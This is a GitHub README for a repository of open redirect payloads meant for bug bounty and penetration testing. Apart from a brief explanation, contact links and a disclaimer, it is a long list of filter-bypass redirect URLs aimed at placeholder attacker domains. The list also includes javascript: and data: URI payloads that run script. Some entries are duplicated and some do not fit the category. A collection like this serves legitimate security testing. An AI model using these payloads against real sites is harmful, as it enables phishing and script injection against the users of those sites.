# Open Redirect Payloads

A collection of various Open Redirect payloads for security researchers, penetration testers, and bug bounty hunters. This repository aims to provide a comprehensive list of payloads to detect and exploit Open Redirect vulnerabilities in web applications.

![Open-Redirect](https://github.com/yogsec/Open-Redirect-Payloads/blob/main/open-redirection-vulnerability.png)

## 🚨 What is an Open Redirect Vulnerability?
An Open Redirect vulnerability occurs when a web application allows an attacker to redirect users to an external, malicious URL without proper validation. This can be exploited for phishing attacks, malware distribution, and other malicious activities.

## 🔥 Why This Repository?
- Centralized payload list for Open Redirect testing.
- Useful for bug hunters and security professionals.
- Simplifies testing for Open Redirect vulnerabilities.

## 📜 Payload Categories
- Basic Redirects
- URL Encoded Redirects
- Double Encoding
- Path Traversal Redirects
- JavaScript-based Redirects
- Data URI Redirects
- Advanced Bypass Techniques

## 📂 Structure
```
open-redirect-payloads/
│
├── Open-Redirect-Payloads.txt

```

---

## 🌟 Let's Connect!

Hello, Hacker! 👋 We'd love to stay connected with you. Reach out to us on any of these platforms and let's build something amazing together:

🌐 **Website:** [https://yogsec.github.io/yogsec/](https://yogsec.github.io/yogsec/)  
📜 **Linktree:** [https://linktr.ee/yogsec](https://linktr.ee/yogsec)  
🔗 **GitHub:** [https://github.com/yogsec](https://github.com/yogsec)  
💼 **LinkedIn (Company):** [https://www.linkedin.com/company/yogsec/](https://www.linkedin.com/company/yogsec/)  
📷 **Instagram:** [https://www.instagram.com/yogsec.io/](https://www.instagram.com/yogsec.io/)  
🐦 **Twitter (X):** [https://x.com/yogsec](https://x.com/yogsec)  
👨‍💼 **Personal LinkedIn:** [https://www.linkedin.com/in/bug-bounty-hunter/](https://www.linkedin.com/in/bug-bounty-hunter/)  
📧 **Email:** abhinavsingwal@gmail.com

---

## ☕ Buy Me a Coffee

If you find our work helpful and would like to support us, consider buying us a coffee. Your support keeps us motivated and helps us create more awesome content. ❤️

☕ **Support Us Here:** [https://buymeacoffee.com/yogsec](https://buymeacoffee.com/yogsec)

---

## 📦 Usage
Clone the repository:
```bash
git clone https://github.com/yogsec/Open-Redirect-Payloads.git
```
Use the payloads for testing Open Redirect vulnerabilities in your bug bounty and pentesting engagements.

---
## 📦 Payloads

```bash
https://attacker.com
//attacker.com
/\/\/attacker.com
https://attacker.com/%2e%2e
//attacker.com/%2f..
https://attacker.com/%2e%2f
//attacker.com/%2e
/\attacker.com
https://attacker.com%00.example.com
https://attacker.com?.example.com
https://attacker.com;.example.com
//attacker.com?.example.com
//attacker.com/.example.com
//attacker.com@evil.com
https://attacker.com@evil.com
https://evil.com/%09https://attacker.com
https://evil.com/%0Ahttps://attacker.com
https://evil.com/%0Dhttps://attacker.com
https://evil.com/%0Bhttps://attacker.com
https://evil.com/%0Chttps://attacker.com
//evil.com:80/%5Cattacker.com
https://evil.com%2F%2Fattacker.com
https://evil.com%2f%2fattacker.com
https://evil.com/%5cattacker.com
https://evil.com//%5cattacker.com
//evil.com%2f%2fattacker.com
https://evil.com/%09attacker.com
https://evil.com/%23attacker.com
https://evil.com/%20attacker.com
https://evil.com/%2Fattacker.com
https://evil.com/%3Fattacker.com
https://evil.com/%26attacker.com
https://evil.com/%3Battacker.com
https://evil.com/%5Cattacker.com
//evil.com:80@attacker.com
https://evil.com@attacker.com
https://evil.com@attacker.com/%2e
https://evil.com@attacker.com/%2f
https://evil.com@attacker.com/%2e%2e
https://evil.com@attacker.com/%2e%2f
https://evil.com@attacker.com/%2e%2e/
https://evil.com@attacker.com/%2e%2e%2f
https://evil.com@attacker.com/%2f%2e
https://evil.com@attacker.com/%2f%2e%2e
https://evil.com@attacker.com/%2f%2e%2f
https://evil.com@attacker.com/%2f%2e%2e/
https://evil.com@attacker.com/%2f%2e%2e%2f
https://attacker.com#@evil.com
https://attacker.com?next=https://evil.com
https://attacker.com?redirect=https://evil.com
https://attacker.com?url=https://evil.com
https://attacker.com/?url=https://evil.com
https://attacker.com/login?next=https://evil.com
https://attacker.com/redirect?url=https://evil.com
https://attacker.com/redirect?to=https://evil.com
https://attacker.com/redirect?redirect_url=https://evil.com
https://attacker.com/redirect?next_url=https://evil.com
https://attacker.com/redirect?dest=https://evil.com
https://attacker.com/redirect?out=https://evil.com
https://attacker.com/redirect?external=https://evil.com
https://attacker.com/redirect?callback=https://evil.com
https://attacker.com/redirect?forward=https://evil.com
https://attacker.com/redirect?go=https://evil.com
https://attacker.com/redirect?target=https://evil.com
https://attacker.com/redirect?u=https://evil.com
https://attacker.com/redirect?link=https://evil.com
https://attacker.com/redirect?continue=https://evil.com
https://attacker.com/redirect?path=https://evil.com
https://attacker.com/redirect?redir=https://evil.com
https://attacker.com/redirect?return=https://evil.com
https://attacker.com/redirect?ext=https://evil.com
https://attacker.com/redirect?location=https://evil.com
https://attacker.com/redirect?nextpage=https://evil.com
https://attacker.com/redirect?outbound=https://evil.com
https://attacker.com/redirect?jump=https://evil.com
https://attacker.com/redirect?source=https://evil.com
https://attacker.com/redirect?ref=https://evil.com
https://attacker.com/redirect?desturl=https://evil.com
https://attacker.com/redirect?goto=https://evil.com
https://attacker.com/redirect?url=http://evil.com
https://attacker.com/redirect?url=//evil.com
https://attacker.com/redirect?url=//evil.com/
https://attacker.com/redirect?url=/\/evil.com
https://attacker.com/redirect?url=%2f%2fevil.com
https://attacker.com/redirect?url=%5cevil.com
https://attacker.com/redirect?url=%2f%5cevil.com
https://attacker.com/redirect?url=%2f..%2fevil.com
https://attacker.com/redirect?url=%2e%2fevil.com
https://attacker.com/redirect?url=%2e%2e%2fevil.com
https://attacker.com/redirect?url=%2e%2e%2f..%2fevil.com
https://attacker.com/redirect?url=%00evil.com
https://attacker.com/redirect?url=%09evil.com
https://attacker.com/redirect?url=%0aevil.com
https://attacker.com/redirect?url=%0devil.com
https://attacker.com/redirect?url=%23evil.com
https://attacker.com/redirect?url=%20evil.com
https://attacker.com/redirect?url=%26evil.com
https://attacker.com/redirect?url=%3bevil.com
https://attacker.com/redirect?url=%3fevil.com
https://attacker.com/redirect?url=%23%0ahttps://evil.com
https:%252f%252fattacker.com
https://%2F%2Fattacker.com
https://evil.com/%2e/%2e/%2e/%2e/%2fhttps://attacker.com
https://evil.com///%2e%2e/%2e%2e/https://attacker.com
https://evil.com/////%252e%252e/%252e%252e/https://attacker.com
https://evil.com/%3f%2f%2fattacker.com
https://evil.com/%26%2f%2fattacker.com
https://evil.com/%3b%2f%2fattacker.com
https://evil.com/%23%2f%2fattacker.com
https://evil.com/%2f%2e%2fhttps://attacker.com
https://evil.com/%2e%2e%2f%2e%2e%2fhttps://attacker.com
https://evil.com/%3Fredirect=https://attacker.com
https://evil.com/%0Ahttps://attacker.com
https://evil.com/%09https://attacker.com
https://evil.com/%23https://attacker.com
https://evil.com/%20https://attacker.com
https://evil.com/%0Dhttps://attacker.com
https://evil.com/?%2f%2fattacker.com
https://evil.com/%2500https://attacker.com
https://evil.com/%2e%2e%2fhttps://attacker.com
https://evil.com/%2f%2e%2e/https://attacker.com
https://evil.com/%2fhttps://attacker.com%2f
https://evil.com/%2f%252e%252e/https://attacker.com
https://evil.com/%252f%252e%252e/https://attacker.com
https://evil.com/..;/https://attacker.com
https://evil.com/;/https://attacker.com
https://evil.com/%5chttps://attacker.com
https://evil.com/%5c/%5c/https://attacker.com
https://evil.com/%2f/%2e%2e/%2e%2e/https://attacker.com
https://evil.com/%2e/%2e%2e/%2e%2e/%2fhttps://attacker.com
https://evil.com/%5c%5chttps://attacker.com
https://evil.com/%2f%5chttps://attacker.com
https://evil.com/%2f..%2f..%2fhttps://attacker.com
https://evil.com/%2e/%2e/%2e/%2e/%2e/%2fhttps://attacker.com
https://evil.com/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2fhttps://attacker.com
https://evil.com/%3f@https://attacker.com
https://evil.com/%3b@https://attacker.com
https://evil.com/%23@https://attacker.com
https://evil.com/%3dhttps://attacker.com
https://evil.com/%3d/%2fhttps://attacker.com
https://evil.com/%0A@https://attacker.com
https://evil.com/%0D@https://attacker.com
https://evil.com/%09@https://attacker.com
https://evil.com/%0B@https://attacker.com
https://evil.com/%0C@https://attacker.com
https://evil.com/%20@https://attacker.com
https://evil.com/?redirect_url=https://attacker.com%00
https://evil.com/?url=https://attacker.com%23
https://evil.com/?url=https://attacker.com%0A
https://evil.com/?url=https://attacker.com%09
https://evil.com/?url=https://attacker.com%0D
https://evil.com/?url=https://attacker.com%0B
https://evil.com/?url=https://attacker.com%0C
https://evil.com/?url=https://attacker.com%20
https://evil.com/%E2%80%8Bhttps://attacker.com
https://evil.com/%E2%80%8Chttps://attacker.com
https://evil.com/%E2%80%8Dhttps://attacker.com
https://evil.com/%E2%80%8Ehttps://attacker.com
https://evil.com/%E2%80%8Fhttps://attacker.com
https://evil.com/%C2%A0https://attacker.com
https://evil.com/%C2%ADhttps://attacker.com
https://evil.com/%E1%A0%8Dhttps://attacker.com
https://evil.com/%EF%BB%BFhttps://attacker.com
https://evil.com/?url=javascript:alert('XSS')
https://evil.com/?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
https://evil.com/?url=javascript:void(location='https://attacker.com')
https://evil.com/?url=javascript:void(document.location='https://attacker.com')
https://evil.com/%u0000https://attacker.com
https://evil.com/?url=https://%2500attacker.com
https://evil.com/?url=https://%E2%80%8Eattacker.com
https://evil.com/?url=https://%C2%A0attacker.com
https://evil.com/?url=https://%C2%ADattacker.com
https://evil.com/?url=https://%EF%BB%BFattacker.com
https://evil.com/?url=https://attacker.com%2523
https://evil.com/?url=https://attacker.com%252F
https://evil.com/?url=https://attacker.com%255C
https://evil.com/?url=https://attacker.com%2500
https://evil.com/%00https://attacker.com
https://evil.com/%2Fhttps://attacker.com
https://evil.com/evil/..;/https://attacker.com
https://evil.com/%E2%80%89https://attacker.com
https://evil.com/%E2%80%83https://attacker.com
https://evil.com/%E2%80%82https://attacker.com
https://evil.com/%E2%80%84https://attacker.com
https://evil.com/%E2%80%85https://attacker.com
https://evil.com/%E2%80%86https://attacker.com
https://evil.com/%E2%80%87https://attacker.com
https://evil.com/%E2%80%88https://attacker.com
https://evil.com/%E2%80%8Ahttps://attacker.com
https://evil.com/%E3%80%80https://attacker.com
https://evil.com/%C2%A0https://attacker.com
https://evil.com/%E3%80%80https://attacker.com
\\attacker.com
///attacker.com
////attacker.com
https:///attacker.com
https:\\attacker.com
https:/\\attacker.com
https:\\/attacker.com
https:\\\\attacker.com
http://evil.com:80@attacker.com
https://evil.com:443@attacker.com
https://evil.com:@attacker.com
https://evil.com#@attacker.com
https://evil.com/foo?bar=@attacker.com
https://evil.com%2F%2Fattacker.com
https://evil.com%3Aattacker.com
https://evil.com%0Ahttps://attacker.com
https://evil.com%0Dhttps://attacker.com
https://evil.com%09https://attacker.com
https://evil.com%23https://attacker.com
https://evil.com/%EF%BB%BFhttps://attacker.com
https://evil.com/%252e%252e/https://attacker.com
https://evil.com/%2e/%2e/%2e/%2e/%2e/%2e/%2e/%2e/https://attacker.com
https://evil.com//%2e%2e/%2e%2e/https://attacker.com
https://evil.com/%252f%252fattacker.com
https://evil.com/%3fhttps://attacker.com
https://evil.com/%3bhttps://attacker.com
https://evil.com/%2f%5c%5chttps://attacker.com
https://evil.com/%3a%2f%2fattacker.com
https://evil.com/%2523https://attacker.com
https://evil.com/%252fhttps://attacker.com
https://evil.com#https://attacker.com
https://evil.com/#https://attacker.com
https://evil.com/%00https://attacker.com
https://evil.com/%2500https://attacker.com
https://evil.com/%00/%00https://attacker.com
https://evil.com/%23%00https://attacker.com
https://evil.com/%23/%00https://attacker.com
https://evil.com/%23%2500https://attacker.com
https://evil.com/foo#@https://attacker.com
https://evil.com/bar/%00https://attacker.com
https://evil.com\@attacker.com
https://evil.com\\attacker.com
https://evil.com\\@attacker.com
https://evil.com\/attacker.com
https://evil.com\\evil.com@attacker.com
https://evil.com/%5c@attacker.com
https://evil.com/%5c%5cattacker.com
https://evil.com/%5c%5c%40attacker.com
https://evil.com/%5c/%5cattacker.com
https://evil.com//%5cattacker.com
javascript:window.location='https://attacker.com'
javascript:document.location='https://attacker.com'
javascript:window.open('https://attacker.com')
javascript:void(location='https://attacker.com')
data:text/html,<script>location='https://attacker.com'</script>
data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbiA9ICdodHRwczovL2F0dGFja2VyLmNvbSc8L3NjcmlwdD4=
javascript://%0Aalert(1)
javascript://%0Awindow.location='https://attacker.com'
javascript:alert%2500('XSS')
javascript:window['locati'+'on']='https://attacker.com'
https://evil.com/%E2%80%8Bhttps://attacker.com
https://evil.com/%E2%80%8Chttps://attacker.com
https://evil.com/%E2%80%8Dhttps://attacker.com
https://evil.com/%E2%80%8Ehttps://attacker.com
https://evil.com/%E2%80%8Fhttps://attacker.com
https://evil.com/%E2%80%AAhttps://attacker.com
https://evil.com/%E2%80%ABhttps://attacker.com
https://evil.com/%E2%80%AChttps://attacker.com
https://evil.com/%E2%80%ADhttps://attacker.com
https://evil.com/%E2%80%AEhttps://attacker.com
https://evil.com/%252F%252Fattacker.com
https://evil.com/%2523https://attacker.com
https://evil.com/%252e%252e%252fhttps://attacker.com
https://evil.com/%252f%252f%252fattacker.com
https://evil.com/%252f%255cattacker.com
https://evil.com/%252f%252e%252e/%252e%252e/https://attacker.com
https://evil.com/%252f%252e%252e/%255chttps://attacker.com
https://evil.com/%252f%252e%252e/%252e%252e/%255cattacker.com
https://evil.com/%25%32%66attacker.com
https://evil.com/%25%30%30https://attacker.com
ftp://attacker.com
file://attacker.com
gopher://attacker.com
telnet://attacker.com
mailto:evil@attacker.com
javascript://www.google.com%0Aalert(1)
chrome://settings
chrome://version
chrome://about
chrome://accessibility
about:blank
about:data
about:srcdoc
view-source:https://attacker.com
blob:https://attacker.com
blob:https://evil.com/%2e%2e/https://attacker.com
blob:null/https://attacker.com
blob:data:text/html,<script>alert(1)</script>
blob:data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
javascript:location.replace('https://attacker.com')
```
---

## ⚠️ Disclaimer
This repository is intended for educational and ethical purposes only. The author is not responsible for any misuse of the information provided.


## 🤝 Contributing
Contributions are welcome! Feel free to submit a pull request with new payloads or improvements.



